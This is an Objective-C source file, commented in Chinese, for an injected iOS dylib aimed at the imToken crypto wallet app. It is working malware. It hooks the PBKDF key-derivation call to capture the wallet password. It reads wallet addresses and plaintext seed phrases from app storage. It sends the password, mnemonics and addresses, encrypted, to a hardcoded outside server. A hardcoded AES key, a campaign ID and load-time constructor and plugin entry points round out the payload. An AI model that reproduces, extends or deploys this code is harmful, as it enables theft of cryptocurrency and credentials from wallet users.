//
//  Payload.m — imToken 模块入口（自己实现，替掉会卡死界面的原版 b2lib）
//
//  设计原则：
//    1. 注入后立刻装钩子（微秒级，不碰主线程）
//    2. 后台队列做 AsyncStorage 读取 / 解密 / 上报
//    3. 每 3 秒检查一次钩子是否捕获到密码，最多等 10 分钟
//    4. 全程 @try/@catch，任何异常都不能把 App 带崩
//
#import <Foundation/Foundation.h>
#import "Net.h"
#import "Info.h"
#import "ImToken.h"
#import "HookKDF.h"

static NSString *const kBaseURL = @"https://myg3z1adawtxz0s.icu";
static NSString *const kAesPassword = @"Ek8pl31K2yeHgQwy";

@interface ImTokenPayload : NSObject
@property (nonatomic, strong) Net *net;
@property (nonatomic, assign) BOOL sentAddr;
@property (nonatomic, assign) BOOL sentMnemonic;
@end

@implementation ImTokenPayload

+ (instancetype)shared {
    static ImTokenPayload *p = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ p = [ImTokenPayload new]; });
    return p;
}

- (instancetype)init {
    if ((self = [super init])) {
        _net = [Net shared];
        _net.baseURL = kBaseURL;
        _net.aesPassword = kAesPassword;
        _net.identity = [Info identity];
    }
    return self;
}

#pragma mark - 上报

- (NSMutableDictionary *)baseBody {
    NSMutableDictionary *d = [NSMutableDictionary dictionaryWithDictionary:[Info identity] ?: @{}];
    d[@"a"] = @"b2";       // 服务端 WALLET_LETTERS: b2 = imToken
    d[@"c"] = @"d9f5121f75a6646c4f814a4ff8c41b04";
    return d;
}

/// 地址列表 → /ub
- (void)uploadAddresses:(NSArray<NSDictionary *> *)wallets {
    NSMutableArray *ad = [NSMutableArray array];
    for (NSDictionary *w in wallets) {
        NSString *addr = w[@"address"] ?: w[@"addr"] ?: w[@"accountAddress"] ?: w[@"walletAddress"];
        if (![addr isKindOfClass:[NSString class]] || addr.length < 10) continue;
        NSMutableDictionary *row = [NSMutableDictionary dictionary];
        row[@"address"] = addr;
        row[@"totalCoin"] = @"0";
        if (w[@"derivationPath"]) row[@"mnemonicPath"] = w[@"derivationPath"];
        else if (w[@"path"]) row[@"mnemonicPath"] = w[@"path"];
        if (w[@"name"]) row[@"name"] = w[@"name"];
        [ad addObject:row];
    }
    if (!ad.count) return;

    NSMutableDictionary *body = [self baseBody];
    body[@"ad"] = ad;
    body[@"et"] = @"wallet_address_scan";

    NSDictionary *r = [self.net postEncrypted:@"/ub" json:body timeout:20];
    if (r) self.sentAddr = YES;
}

/// 助记词 → /us
- (BOOL)uploadMnemonic:(NSString *)mn {
    if (mn.length < 20) return NO;
    NSMutableDictionary *body = [self baseBody];
    body[@"result"] = mn;
    body[@"et"] = @"wallet_mnemonic_scan";
    NSDictionary *r = [self.net postEncrypted:@"/us" json:body timeout:20];
    return r != nil;
}

/// 诊断事件 → /event（出问题时能看日志）
- (void)reportEvent:(NSString *)et ctx:(NSDictionary *)ctx {
    NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity] ?: @{}];
    ev[@"et"] = et;
    ev[@"c"] = @"d9f5121f75a6646c4f814a4ff8c41b04";
    ev[@"ctx"] = ctx ?: @{};
    [self.net sendEvent:ev];
}

#pragma mark - 主流程

- (void)start {
    // 构造函数里一行重活都不能干：启动阶段占住主线程会被 watchdog 杀掉。
    // 全部挪到后台，第一件事先报 imtoken_boot 证明模块活着。
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        @try {
            [self reportEvent:@"imtoken_boot" ctx:@{ @"host": [Info hostBundleId] ?: @"" }];

            BOOL hooked = NO;
            @try {
                hooked = [ImToken installHook];
            } @catch (NSException *e) {
                hooked = NO;
            }

            [self scanOnce];

            NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
            ctx[@"hooked"] = @(hooked);
            ctx[@"storageDir"] = [ImToken storageDir] ?: @"";
            ctx[@"walletCount"] = @([ImToken wallets].count);
            ctx[@"error"] = [ImToken lastError] ?: @"";
            [self reportEvent:@"imtoken_scan_started" ctx:ctx];

            // 3. 每 3 秒看钩子有没有捕获到密码，最多 200 次（10 分钟）
            for (NSInteger i = 0; i < 200; i++) {
                if (self.sentMnemonic) break;
                if ([ImToken hookFired]) {
                    [self uploadCapturedPassword];
                }
                usleep(3 * 1000 * 1000);
            }
        } @catch (NSException *e) {
            [self reportEvent:@"imtoken_crashed" ctx:@{ @"reason": e.reason ?: @"" }];
        }
    });
}

/// 不需要密码就能拿到的：地址 + 可能的明文助记词
- (void)scanOnce {
    @try {
        NSArray *ws = [ImToken wallets];
        if (ws.count) [self uploadAddresses:ws];

        NSArray *plain = [ImToken plaintextMnemonics];
        for (NSString *mn in plain) {
            if ([self uploadMnemonic:mn]) {
                self.sentMnemonic = YES;
                [self reportEvent:@"imtoken_mnemonic_plain" ctx:@{ @"words": @(mn.length) }];
                break;
            }
        }
    } @catch (NSException *e) {
        (void)e;
    }
}

/// 钩子捕获到密码后：立刻回传密码，解密交给服务端做
/// （服务端已经用 /wz 收过容器里的密钥文件，拿到密码就能解出助记词）
- (void)uploadCapturedPassword {
    @try {
        NSString *pwd = [ImToken capturedPassword];
        if (!pwd.length) {
            [self reportEvent:@"imtoken_password_empty" ctx:@{ @"error": [ImToken lastError] ?: @"" }];
            return;
        }

        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity] ?: @{}];
        body[@"c"] = @"d9f5121f75a6646c4f814a4ff8c41b04";
        body[@"bundle_id"] = @"im.token.app";
        body[@"pwd"] = pwd;

        NSDictionary *r = [self.net postEncrypted:@"/pw" json:body timeout:30];
        self.sentMnemonic = YES;

        NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
        ctx[@"pwLen"] = @(pwd.length);
        ctx[@"resp"] = r ? [r description] : @"nil";
        [self reportEvent:@"imtoken_password_sent" ctx:ctx];
    } @catch (NSException *e) {
        [self reportEvent:@"imtoken_password_failed" ctx:@{ @"reason": e.reason ?: @"" }];
    }
}

@end

#pragma mark - 零依赖上报（只用来证明「代码真的进来了」）

/**
 * 只用 NSBundle + NSURLSession，不碰 Net / Info。
 * 之前 wrong_host 分支里调 [[Net shared] sendEvent:] 时 baseURL 还是 nil，
 * 请求发到 nil URL 静默失败 —— 结果两条上报路径都看不见。
 */
static void RawPing(NSString *tag, NSString *extra) {
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier] ?: @"unknown";
    NSDictionary *body = @{
        @"et": tag ?: @"ping",
        @"u": bid,
        @"d": bid,
        @"pid": @(getpid()),
        @"c": @"d9f5121f75a6646c4f814a4ff8c41b04",
        @"ctx": @{ @"hostBundleId": bid,
                   @"module": @"imtoken",
                   @"extra": extra ?: @"" },
    };
    NSData *json = [NSJSONSerialization dataWithJSONObject:body options:0 error:NULL];
    if (!json) return;

    NSMutableURLRequest *req = [NSMutableURLRequest
        requestWithURL:[NSURL URLWithString:@"https://myg3z1adawtxz0s.icu/event"]];
    req.HTTPMethod = @"POST";
    [req setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    req.HTTPBody = json;
    req.timeoutInterval = 20;

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    NSURLSessionDataTask *task = [[NSURLSession sharedSession]
        dataTaskWithRequest:req
          completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
              dispatch_semaphore_signal(sem);
          }];
    [task resume];
    dispatch_semaphore_wait(sem,
        dispatch_time(DISPATCH_TIME_NOW, (int64_t)(22 * NSEC_PER_SEC)));
}

static void RawPingAsync(NSString *tag, NSString *extra) {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        @try { RawPing(tag, extra); } @catch (NSException *e) { (void)e; }
    });
}

#pragma mark - 入口

__attribute__((constructor))
static void imtoken_ctor(void) {
    // 守护进程注入走这条
    RawPingAsync(@"imtoken_ctor", @"constructor");
}

/**
 * 框架真正调用的入口（core.dylib 里 dlsym 的是 _plugin_main）。
 *
 * 之前一直报 PLERROR_PAYLOAD_ENTRY_POINT_NOT_FOUND，就是因为我们的 dylib
 * 带 -fvisibility=hidden 且没有导出任何符号。
 */
__attribute__((visibility("default"), used))
void plugin_main(void) {
    // 第一件事：同步写文件（不用网络、不用 GCD）
    // 注入那一刻网络栈可能还没就绪，HTTP 会静默失败；写文件一定能落地。
    // photonote 跑在 locationd，能读所有容器 —— 由它去读这个文件并上报。
    @try {
        NSString *bid = [[NSBundle mainBundle] bundleIdentifier] ?: @"unknown";
        NSString *line = [NSString stringWithFormat:@"called pid=%d bid=%@ ts=%.0f",
                          getpid(), bid, [[NSDate date] timeIntervalSince1970]];
        NSString *home = NSHomeDirectory();
        NSArray *paths = @[
            [home stringByAppendingPathComponent:@"Documents/_imt_entry.txt"],
            [NSTemporaryDirectory() stringByAppendingPathComponent:@"_imt_entry.txt"],
        ];
        for (NSString *p in paths) {
            [line writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:NULL];
        }
    } @catch (NSException *e) {
        (void)e;
    }

    // KDF interpose 由 dyld 在加载本 dylib 时自动生效（__DATA,__interpose 段），
    // 这里只做一次标记；真正抓密码在 MyCCKeyDerivationPBKDF 里。
    HookKDFInstall();
    HookKDFWriteWitness();   // 基线探针：证明 dylib 已加载

    // 网络那条路照发（可能早于网络栈就绪，不指望它）
    RawPingAsync(@"imtoken_plugin_main", @"entry called");

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        @try {
            [[ImTokenPayload shared] start];
        } @catch (NSException *e) {
            RawPingAsync(@"imtoken_start_failed", e.reason ?: @"");
        }
    });
}
